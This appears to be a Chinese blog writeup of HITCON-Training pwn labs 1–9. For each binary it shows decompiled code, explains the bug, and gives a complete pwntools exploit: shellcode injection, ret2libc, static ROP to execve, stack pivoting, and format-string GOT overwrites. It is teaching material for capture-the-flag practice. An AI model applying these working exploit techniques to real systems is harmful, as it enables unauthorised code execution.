---
title: HITCON_training题解(一)
date: 2019-04-10 14:47:42
tags: pwn
---

## Lab1——sysmagic ##

### 防护 ###

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab1/sysmagic'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

### 分析 ###

程序要求输入一个magic，然后就直接退出。用IDA看一下：

在函数get_flag中直接要求读入到栈上v2处（ebp+0x7c），如果v2和随机数buf相等，则直接打印出栈上的flag。buf在(ebp+0x80处)。不过貌似没有较好的溢出方法，不过这实际上是一道逆向题，通过逆向可以直接找到答案。

```c
	fd = open("/dev/urandom", 0);
  read(fd, &buf, 4u);
  printf("Give me maigc :");
  __isoc99_scanf("%d", &v2);
  if ( buf == v2 )
  {
    for ( i = 0; i <= 0x30; ++i )
      putchar((char)(*(&v5 + i) ^ *((_BYTE *)&v54 + i)));
  }
```

观察汇编代码，还原两个字符串，然后按位异或即可找到flag。

```
str1 = '\x44\x6f\x5f\x79\x6f\x75\x5f\x6b'
str1 += '\x6e\x6f\x77\x5f\x77\x68\x79\x5f'
str1 += '\x6d\x79\x5f\x74\x65\x61\x6d\x6d'
str1 += '\x61\x74\x65\x5f\x4f\x72\x61\x6e'
str1 += '\x67\x65\x5f\x69\x73\x5f\x73\x6f'
str1 += '\x5f\x61\x6e\x67\x72\x79\x3f\x3f\x3f'
str2 = '\x07\x3b\x19\x02\x0b\x10\x3d\x1e'
str2 += '\x09\x08\x12\x2d\x28\x59\x0a\x00\x1e'
str2 += '\x16\x00\x04\x55\x16\x08\x1f\x07\x01'
str2 += '\x09\x00\x7e\x1c\x3e\x0a\x1e\x0b\x6b'
str2 += '\x04\x42\x3c\x2c\x5b\x31\x55\x02\x1e'
str2 += '\x21\x10\x4c\x1e\x42'

flag = ""

for i in range(len(str1)):
	flag += chr(ord(str1[i]) ^ ord(str2[i]))

print flag

CTF{debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!}
[Finished in 0.1s]
```

<!-- more -->


## Lab2——orw ##

是手写汇编的练习，略。

## Lab3——ret2shellcode ##

### 防护 ###

未开启任何防护

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab3$ checksec ret2sc
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab3/ret2sc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

### 分析 ###

顾名思义，该题是用ret2sc的方法。main函数中首先从stdin读入，往bss段上写了0x32字节，然后栈溢出返回到刚刚写的地址即可。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-14h]

  setvbuf(stdout, 0, 2, 0);
  printf("Name:");
  read(0, &name, 0x32u);
  printf("Try your best:");
  return (int)gets(&s);
}
```

exp如下：

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./ret2sc")
p = process("./ret2sc")
# ref: https://www.exploit-db.com/shellcodes/41630
shellcode = "\xeb\x10\x5e\x31\xc9\xb1\x15\x8a\x06\x34\xe9\x88\x06\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xd8\x20\xb8\x81\xc6\xc6\x9a\x81\x81\xc6\x8b\x80\x87\x60\x0a\x83\xe2\xb1\x70\x24\x69"
bss_addr = 0x804a060
offset = 0x1c + 4
p.sendafter("Name:", shellcode)
# gdb.attach(p)
p.sendafter("Try your best:", offset *"a" + p32(bss_addr))

p.interactive()
```

## Lab4——ret2lib ##

### 防护 ###

开启了NX，无法使用ret2sc。

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab4$ checksec ret2lib
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab4/ret2lib'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

### 分析 ###

程序首先会主动leak出任意地址，可以通过这一点leak got表获取libc的加载基址，然后构造rop链即可。

注意在Print_message中dest离eip的偏移为0x38 + 4

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char **v3; // ST04_4
  int v4; // ST08_4
  char src; // [esp+12h] [ebp-10Eh]
  char buf; // [esp+112h] [ebp-Eh]
  _DWORD *v8; // [esp+11Ch] [ebp-4h]

  puts("###############################");
  puts("Do you know return to library ?");
  puts("###############################");
  puts("What do you want to see in memory?");
  printf("Give me an address (in dec) :");
  fflush(stdout);
  read(0, &buf, 0xAu);
  v8 = (_DWORD *)strtol(&buf, v3, v4);
  See_something(v8);
  printf("Leave some message for me :");
  fflush(stdout);
  read(0, &src, 0x100u);
  Print_message(&src);
  puts("Thanks you ~");
  return 0;
}
```

exp如下：

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./ret2lib")
p = process("./ret2lib")

p.recvuntil(":")
p.send(str(elf.got['__libc_start_main']))
addr = int(p.recvline().split(": ")[-1].strip(), 16)

libc.address = addr - libc.symbols['__libc_start_main']
system = libc.symbols['system']
write = libc.symbols['write']
binsh = next(libc.search("/bin/sh"))

main_addr = 0x8048570

offset = 0x38 + 4
rop = offset * "a"
rop += p32(system)
rop += p32(main_addr)
rop += p32(binsh)

p.sendafter("for me :", rop)

p.interactive()
```

## Lab5——simplerop ##

### 防护 ###

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab5$ checksec simplerop
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab5/simplerop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

### 分析 ###

直接栈溢出。不过该题是静态链接的，没有加载libc.so，并且题目中没有system，所以需要手动构造ROP链，利用系统调用sys_execve执行利用。

首先要把参数写到相应的寄存器，然后执行int 0x80

- 系统调用号存入EAX（execve的为11）
- 通过ebx,ecx,edx,esi,edi等传递参数
- 最后调用int 0x80

这里要用到ROPgadget工具，来搜索可用的gadget。主要就是一些pop|ret和int 0x80的gadget。

另外，题目中没有现成的/bin/sh字符串，需要首先写入。我采用的是调用静态链接进来的read函数，写入到bss段。官方writeup中采用了一种更为巧妙的方法，使用如下的gadget

```assembly
mov dword ptr [edx], eax ;
ret ;
```

通过`pop eax;ret pop edx; ret`将字符串四位四位的写到data段（或bss段）。可以看到这种方法的通用性更强。

```python
#write to memory
payload = "a"*32
payload += p32(pop_edx_ret)
payload += p32(buf)
payload += p32(pop_eax_ret)
payload += "/bin"
payload += p32(gadget)
payload += p32(pop_edx_ret)
payload += p32(buf+4)
payload += p32(pop_eax_ret)
payload += "/sh\x00"
payload += p32(gadget)
```

我的exp如下：

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./simplerop")
p = process("./simplerop")

int80 = 0x080493e1
popecx_popebx = 0x0806e851
popeax = 0x080bae06
popedx = 0x0806e82a
bss_addr = 0x80ec2c0
main_addr = 0x8048e24
read = 0x806cd50
offset = 0x20


p.recvuntil(":")
rop = offset * "a"
rop += p32(read)
rop += p32(main_addr)
rop += p32(0)
rop += p32(bss_addr)
rop += p32(8)

p.sendline(rop)

from time import sleep
sleep(1)
p.send("/bin/sh\x00")

gdb.attach(p)
p.recvuntil(":")
rop = (offset - 8) * "a"
rop += p32(popeax)
rop += p32(0xb)
rop += p32(popecx_popebx)
rop += p32(0) + p32(bss_addr)
rop += p32(popedx)
rop += p32(0)
rop += p32(int80)

p.sendline(rop)

p.interactive()
```

## Lab6——migration ##

### 防护 ###

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab6$ checksec migration
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab6/migration'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

### 分析 ###

该题溢出的字节较少，而又需要leak libc，构造利用链，所以显然栈空间是不够的；但是又不能先布置shellcode，再`jmp esp`跳到shellcode执行，所以需要考虑其他方法。根据题目名字的提示，应该是用栈迁移的方法。

用ROPgadget搜索，注意到以下gadget

```
0x08048418 : leave ; ret
```

我们通过溢出将栈布局为如下格式：

```
buffer padding | fake ebp | leave ret addr|
```

- 函数的返回地址被覆盖为leave_ret的地址，这样在函数执行完自己的leave_ret后还会在执行一次leave_ret。当函数执行完自己的leave时，ebp为fake ebp的值，即指向ebp2；当函数再执行自己的ret的时候，会执行leave_ret，先令esp也指向ebp2，然后将fake ebp处的第一个4bytes pop给ebp，即将ebp的值修改为ebp2，然后执行ret，将fake ebp后的第二个4bytes所存的地址给eip，即将eip的值修改为target function addr。
- 如果调用的是函数，则函数入口点首先会调用push ebp，就会将ebp2的值压栈；然后调用mov ebp，esp，ebp指向当前基地址。
- 由上可知，我们fake ebp处假的栈桢结构如下：

```
fake ebp

ebp2 | target function addr | leave ret addr | arg1 | arg2

```

- 当程序在执行完target function之后，会再执行两次leave_ret，如果我们在ebp2处也布置好了对应的内容，就可以一直控制程序的执行流程

我们需要一块可以写的内存，并且我们还知道这块内存的地址。所以通过gdb调试可以看出，由于未开启PIE，elf文件所加载的地址我们是知道的，而这其中可读可写的段有0x804a000~0x804b000，在这0x1000个bytes中找一块内存区域即可。

```
gef➤  vmmap
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /home/liwc/pwn/HITCON-Training/LAB/lab6/migration
0x08049000 0x0804a000 0x00000000 r-- /home/liwc/pwn/HITCON-Training/LAB/lab6/migration
0x0804a000 0x0804b000 0x00001000 rw- /home/liwc/pwn/HITCON-Training/LAB/lab6/migration
0xf7dfe000 0xf7dff000 0x00000000 rw- 
0xf7dff000 0xf7faf000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb1000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so
0xf7fb1000 0xf7fb2000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so
0xf7fb2000 0xf7fb5000 0x00000000 rw- 
0xf7fd3000 0xf7fd4000 0x00000000 rw- 
0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rw- [stack]

```

### 利用 ###

#### 1.将fake_frame写到RW段 ####

执行两次leave ret跳转到rwadddr

```python
rop = offset * "a"
rop += p32(rwaddr) # fake ebp
rop += p32(read_plt) # retn_addr
rop += p32(leaveret) # retn_addr of read
rop += p32(0) # arg1
rop += p32(rwaddr) # arg2
rop += p32(0x100) # arg3

```

#### 2.leak libc ####

执行两次leave ret跳转到rwaddr+0x100

```python
rop += p32(rwaddr + 0x100) # fake ebp
rop += p32(puts_plt) # retn_addr
rop += p32(pop1) # adjust stack to next part chain of rop
rop += p32(elf.got['__libc_start_main']) # arg1
rop += p32(read_plt) # call read
rop += p32(leaveret) # retn_addr of read
rop += p32(0) # arg1
rop += p32(rwaddr + 0x100) # arg2
rop += p32(0x100) # arg3

```

#### 3.RCE ####

rwaddr+0x100处直接getshell

```python
rop = p32(rwaddr)
rop += p32(system)
rop += p32(0xdeadbeef)
rop += p32(binsh)

```

完整exp如下：

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./migration")
p = process("./migration")

offset = 0x28
popebp = 0x0804856b
ret = 0x08048356
leaveret = 0x08048418
rwaddr = 0x0804b000-0x300
# 0x0804836d : pop ebx ; ret
pop1 = 0x0804836d
read_plt = elf.plt['read']
puts_plt = elf.plt['puts']

p.recvuntil(" :\n")
rop = offset * "a"
rop += p32(rwaddr) # fake ebp
rop += p32(read_plt) # retn addr
rop += p32(leaveret) # retn addr of read
rop += p32(0) # arg1
rop += p32(rwaddr) # arg2
rop += p32(100) # arg3

p.send(rop)
from time import sleep
sleep(0.1)
# gdb.attach(p)
rop = p32(rwaddr + 0x100) # fake ebp
rop += p32(puts_plt) # retn addr
rop += p32(pop1) # retn addr of puts_plt
rop += p32(elf.got['__libc_start_main'])
rop += p32(read_plt) # after pop 1
rop += p32(leaveret)
rop += p32(0) # arg1
rop += p32(rwaddr + 0x100) #arg2
rop += p32(100) #arg2

p.sendline(rop)

addr = u32(p.recvline()[:4])
libc.address = addr - libc.symbols['__libc_start_main']
system = libc.symbols['system']
binsh = next(libc.search("/bin/sh"))

rop = p32(rwaddr)
rop += p32(system)
rop += p32(0xdeadbeef)
rop += p32(binsh)

p.sendline(rop)

p.interactive()

```

## Lab7——Crack ##

### 防护 ###

开了canary，栈利用应该比较困难。

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab7$ checksec crack
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab7/crack'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)


```

### 分析 ###

该题是典型的格式化字符串利用，将bss段的全局变量passwprd覆盖为已知值即可。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int fd; // ST14_4
  char nptr; // [esp+8h] [ebp-80h]
  char buf; // [esp+18h] [ebp-70h]
  unsigned int v8; // [esp+7Ch] [ebp-Ch]

  v8 = __readgsdword(0x14u);
  setvbuf(_bss_start, 0, 2, 0);
  v3 = time(0);
  srand(v3);
  fd = open("/dev/urandom", 0);
  read(fd, &password, 4u);
  printf("What your name ? ");
  read(0, &buf, 0x63u);
  printf("Hello ,");
  printf(&buf);
  printf("Your password :");
  read(0, &nptr, 0xFu);
  if ( atoi(&nptr) == password )
  {
    puts("Congrt!!");
    system("cat /home/crack/flag");
  }
  else
  {
    puts("Goodbyte");
  }
  return 0;
}

```

### 利用 ###

首先测得 or 调试得到格式化字符串在栈中的偏移为10，然后布置`target_addr%10$n`的格式化字符串，向target_addr写入4。然后输入4即可。

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./crack")
p = process("./crack")

p.recvuntil("? ")
payload = p32(0x804a048)
payload += "%10$n"
p.sendline(payload)
p.sendafter(":", "4")

p.interactive()

```

效果：

```
Congrt!!
cat: /home/crack/flag: No such file or directory

```

## Lab8——craxme ##

### 防护 ###

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab8$ checksec craxme
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab8/craxme'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)


```

### 分析 ###

和Lab7相似，也是fmt的利用，分别向目标地址写入218和0xFACEB00C，前者直接写即可

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./craxme")
p = process("./craxme")

p.recvuntil(":")
payload = p32(0x804a038)
payload += (218 - 4) * "a" + "%7$n"
p.sendline(payload)

p.interactive()	

```

后者需要有一定的构造。首先，由于是小端存储，要向内存中写4个byte的数据，只要用`$hhn`分别向单字节写即可。如要想写入0x12345678，相当于分别向target_addr ~ target_addr + 3的地址写入

```
0x78
0x56
0x34
0x12

```

首先将地址放在栈中，然后计算应该padding多少个字节，最后用hhn写入。注意取余

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./craxme")
p = process("./craxme")

p.recvuntil(":")

target_addr = 0x804a038
target = 0xFACEB00C
payload = p32(target_addr) + p32(target_addr + 1) + p32(target_addr + 2) + p32(target_addr + 3)
payload += "%" + str((0x0c - len(payload)) % 256) + "c%7$hhn"
payload += "%" + str((0xb0 - 0x0c) & 0xff)  + "c%8$hhn"
payload += "%" + str((0xce - 0xb0) & 0xff)  + "c%9$hhn"
payload += "%" + str((0xfa - 0xce) & 0xff)  + "c%10$hhn"

p.sendline(payload)

p.interactive()	

```

## Lab9——playfmt ##

### 防护 ###

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab9$ checksec playfmt
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab9/playfmt'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)


```

### 分析 ###

也是格式化字符串的利用，每次向bss段上读入0xc8的格式化字符串，然后printf，当读入quit时，退出。

显然，因为格式化字符串不在栈上，所以处理起来有些麻烦，首先可以看到相对偏移为15的位置有一个libc上的地址，将它leak出来获得libc基地址。

```
gef➤  dereference $esp
0xffffcf0c│+0x0000: 0x08048540  →  <do_fmt+69> add esp, 0x10	 ← $esp
0xffffcf10│+0x0004: 0x0804a060  →  "AAAA%p%p%p%p%p%p%p%p%p"
0xffffcf14│+0x0008: 0x08048640  →  "quit"
0xffffcf18│+0x000c: 0x00000004
0xffffcf1c│+0x0010: 0x0804857c  →  <play+51> add esp, 0x10 
0xffffcf20│+0x0014: 0x08048645  →  "====================="
0xffffcf24│+0x0018: 0xf7fb1000  →  0x001b1db0
0xffffcf28│+0x001c: 0xffffcf38  →  0xffffcf48  →  0x00000000	 ← $ebp <= ebp1 7
0xffffcf2c│+0x0020: 0x08048584  →  <play+59> nop <= 8
0xffffcf30│+0x0024: 0xf7fb1d60  →  0xfbad2887
gef➤  dereference $esp
0xffffcf34│+0x0028: 0x00000000
0xffffcf38│+0x002c: 0xffffcf48  →  0x00000000 <= ebp2 11
0xffffcf3c│+0x0030: 0x080485b1  →  <main+42> nop <= 12
0xffffcf40│+0x0034: 0xf7fb13dc  →  0xf7fb21e0  →  0x00000000
0xffffcf44│+0x0038: 0xffffcf60  →  0x00000001
0xffffcf48│+0x003c: 0x00000000
0xffffcf4c│+0x0040: 0xf7e17637  →  <__libc_start_main+247> add esp, 0x10


```

但是，也因为fmt string不在栈上，想要任意地址写则比较困难，这里参考了Vidar-Team某师傅的题解（<https://veritas501.space/2017/05/23/HITCON-training%20writeup/>），利用栈中ebp的相对偏移已知的特点。我们可以看到0xffffcf28处ebp指向0xffffcf38处，而0xffffcf38处指向0xffffcf48处。

这里有几个需要注意的点：

- 首先我们需要leak栈地址，才能利用格式化字符串漏洞进行写入，通过"%6$x"将ebp1处存的ebp2的栈地址leak出来，然后根据相对偏移算出ebp1、nop1、nop2的地址。
- 如果我们修改ebp1，就相当于向ebp2的地址写，再修改ebp2，也就相当于往任意地址写。
- 注意到栈地址只有低2个字节不同，所以用hn写入低两个字节即可修改ebp1处和ebp2处的地址。
- 我们想要劫持got表，将printf@got修改为system。由Lab8可以知道，想写入一个大整数，直接写4个byte是不行的，所以在这里我们分开写，两个byte两个byte的写：将nop1修改为printf@got的地址，将nop2修改为printf@got + 2的地址，然后用%c$hn写入即可。

### 利用 ###

完整的exp如下：

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./playfmt")
p = process("./playfmt")

p.recvuntil("\n")
payload = "%15$paaaa"
p.sendline(payload)
addr = int(p.recvuntil("aaaa").split('aaaa')[0].split("\n")[-1],16)

libc.address = addr - libc.symbols['__libc_start_main'] - 247
system = libc.symbols['system']
binsh = next(libc.search("/bin/sh"))
printfgot = elf.got['printf']

payload1 = "%6$x"
p.recvuntil("\n")
p.sendline(payload1)
ebp2 = int("0x" + p.recvline().strip(), 16)
ebp1 = ebp2 - 0x10
nop2 = ebp2 + 0x4
nop1 = ebp2 - 0xc 

# [ebp2] = nop1
payload = "%" + str(nop1 & 0xffff) + "c%6$hn"
p.recvuntil("\n")
p.sendline(payload)

# [nop1] = printgot
payload = "%" + str(printfgot & 0xffff) + "c%10$hn"
p.recvuntil("\n")
p.sendline(payload)

# [ebp2] = nop2
payload = "%" + str(nop2 & 0xffff) + "c%6$hn"
p.recvuntil("\n")
p.sendline(payload)

# [nop2] = printgot + 2
payload = "%" + str((printfgot + 2) & 0xffff) + "c%10$hn"
p.recvuntil("\n")
p.sendline(payload)

# [printgot] = system
payload = "%" + str(system >> 16 & 0xffff) + "c%11$hn" + "%" + str(((system & 0xffff) - (system >> 16 & 0xffff)) & 0xffff) + "c%7$hn"
p.recvuntil("\n")
p.sendline(payload)

p.recvuntil("\n")
p.sendline("/bin/sh\x00")
p.interactive()	

```



------

本篇到此为止，接下来是glibc heap exploit的题解。

















